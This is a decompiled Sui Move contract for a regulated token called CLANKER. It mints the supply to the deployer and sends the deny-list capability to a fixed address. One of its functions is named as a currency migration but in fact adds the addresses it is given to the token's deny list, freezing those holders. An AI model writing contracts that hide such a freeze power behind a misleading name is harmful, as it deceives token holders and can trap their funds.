module 0x26e82e89f3dbee817d600453db0ff10f09f1a5d7b1ffd7858720b7bbf5e2ed67::CLANKER {
    struct CLANKER has drop {
        dummy_field: bool,
    }

    fun init(arg0: CLANKER, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency<CLANKER>(arg0, 2, b"CLANKER", b"CLANKER", b"CLANKER", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://arweave.net/u60O7krWh_aYkMOanGxQ_9GwQWvLtR0Xw_CsX57vqls?ext=png")), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CLANKER>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCap<CLANKER>>(v1, @0x7c3c58155b85c3ecf4864777fce255a7e405ffa3b6e443e736976588910f0e8d);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CLANKER>(&mut v3, 100000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<CLANKER>>(v3, 0x2::tx_context::sender(arg1));
    }

    entry fun migrate_regulated_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCap<CLANKER>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        while (v0 < 0x1::vector::length<address>(&mut arg2)) {
            let v1 = 0x1::vector::pop_back<address>(&mut arg2);
            if (!0x2::coin::deny_list_contains<CLANKER>(arg0, v1)) {
                0x2::coin::deny_list_add<CLANKER>(arg0, arg1, v1, arg3);
            };
            v0 = v0 + 1;
        };
    }

    // decompiled from Move bytecode v6
}

